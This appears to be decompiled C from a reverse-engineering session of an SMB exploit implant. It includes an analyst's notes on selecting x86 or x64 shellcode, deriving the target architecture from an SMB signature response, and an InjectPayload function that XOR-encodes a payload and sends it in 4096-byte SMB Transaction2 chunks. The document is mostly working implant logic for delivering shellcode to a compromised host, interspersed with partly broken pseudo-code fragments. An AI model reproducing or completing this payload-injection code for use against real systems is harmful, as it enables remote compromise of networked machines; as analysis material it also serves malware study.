/* interesting stuff here

signed int __cdecl sub_401720(_DWORD *a1)
if ( a1[14] == 4 )
  {
    dword_407E1A = a1[23];
    dword_407E1E = a1[24];
    dword_407E22 = a1[25];
    dword_407E26 = a1[26];
    dword_407E16 = a1[27];
    dword_407E2A = a1[29];
    v9 = dword_407E4C;
    byte_407E2E = v5;
    dword_407E3E = dword_407E4C + a1[9];
    dword_407E3A = v8;
    v10 = dword_407034;
    dword_407E42 = 0;
    dword_407E32 = v6;
    dword_407E36 = v7;
    v11 = &x65shellcode;
    v12 = &x64shellcodeagain;
  }
  else
  {
    dword_407048 = a1[23];
    dword_407053 = a1[24];
    dword_40708A = a1[25];
    dword_4072A8 = a1[26];
    dword_40705E = a1[27];
    v9 = dword_407E48;
    dword_4072D6 = a1[29];
    byte_4072EE = v5;
    dword_4075C9 = dword_407E48 + a1[9];
    dword_40707F = v8;
    v10 = dword_407030;
    dword_407069 = v6;
    dword_407074 = v7;
    v11 = &x86shellcode;
    v12 = &x86shellcodeagain;
  }
  */

//usage: InjectPayload((int)a1, v4, (int)&v21, v5, a4, v16, &v17) )

//calc architecture function
v8 = v20; //v8 = v20 ( SMB signature )
//calculate 
v9 = 2 * *(_DWORD *)(v20 + 18) ^ (((*(_DWORD *)(v20 + 18) & 0xFF00 | (*(_DWORD *)(v20 + 18) << 16)) << 8) | (((*(_DWORD *)(v20 + 18) >> 16) | *(_DWORD *)(v20 + 18) & 0xFF0000u) >> 8));
//determine if recv buffer + 22 == 0 or 1
if( v10 = *(char *)(v8 + 22) == 0) {
   //x86 
} else { 
  //if arch = 1 then we are 64 bit
  }


int __cdecl InjectPayload(int a1, int a2, int a3, int a4, size_t *a5, int a6, _DWORD *a7)
{
  int result; // eax
  bool v8; // zf
  bool v9; // sf
  unsigned __int8 v10; // of
  signed __int16 v11; // ax
  unsigned __int16 v12; // dx
  int v13; // ebp
  int v14; // eax
  int v15; // edx
  int v16; // edi
  int v17; // [esp+8h] [ebp-2Ch]
  int v18; // [esp+Ch] [ebp-28h]
  int v19; // [esp+10h] [ebp-24h]
  char v20; // [esp+14h] [ebp-20h]
  int v21; // [esp+15h] [ebp-1Fh]
  int v22; // [esp+19h] [ebp-1Bh]
  int v23; // [esp+1Dh] [ebp-17h]
  int v24; // [esp+21h] [ebp-13h]
  int v25; // [esp+25h] [ebp-Fh]
  int v26; // [esp+29h] [ebp-Bh]
  int v27; // [esp+2Dh] [ebp-7h]

  v20 = 0;
  v21 = 0;
  v22 = 0;
  v23 = 0;
  v24 = 0;
  v25 = 0;
  v26 = 0;
  v27 = 0;
  v17 = 0;
  v18 = 0;
  v19 = 0;
  if ( !a1 || !a2 || !a3 || !a5 || !a7 )
    return 6;
  if ( a4 != 35 && a4 != 119 && a4 != 200 || (signed int)*a5 > (signed int)a5[1] )
    return 6;
  BYTE2(v27) = 1;
  v20 = 15;
  v22 = 1;
  v23 = 0;
  v24 = sub_402C50(a4);
  v25 = 786432;
  HIBYTE(v27) = 0;
  LOWORD(v21) = 12;
  LOWORD(v26) = 66;
  v10 = __OFSUB__(*a5, 4096);
  v8 = *a5 == 4096;
  v9 = (signed int)(*a5 - 4096) < 0;
  LOWORD(v27) = 78;
  if ( (unsigned __int8)(v9 ^ v10) | v8 )
  {
    v11 = *(_WORD *)a5;
    v12 = *(_WORD *)a5;
  }
  else
  {
    v12 = 4096;
    v11 = 4096;
  }
  HIWORD(v21) = v11;
  HIWORD(v26) = v12;
  v13 = (unsigned __int16)(v12 + 13);
  if ( a4 == 200 )
  {
    v14 = *(_DWORD *)(a1 + 80);
    v18 = v14 ^ v12;
    v15 = v14 ^ *a7;
    v17 = a6 ^ v14;
    v19 = v15;
  }
  result = TbMakeSmbHeader(a2, a3, (unsigned __int16)v13 + 65, 50);
  v16 = result;
  if ( !result )
  {
    if ( TbPutTransact(a2, a3, &v20)
      && TbPutShort(a2, a3, 14)
      && TbPutShort(a2, a3, v13)
      && TbPutByte(a2, a3, v16)
      && TbPutBuff(a2, a3, &v17, 12)
      && TbPutBuff(a2, a3, a5[2], HIWORD(v26)) )
    {
      if ( (signed int)*a5 <= 4096 )
      {
        result = v16;
        *a5 = 0;
      }
      else
      {
        *a5 -= 4096;
        *a7 += 4096;
        memmove((void *)a5[2], (const void *)(a5[2] + 4096), *a5);
        result = v16;
      }
    }
    else
    {
      result = 3;
    }
  }
  return result;
}
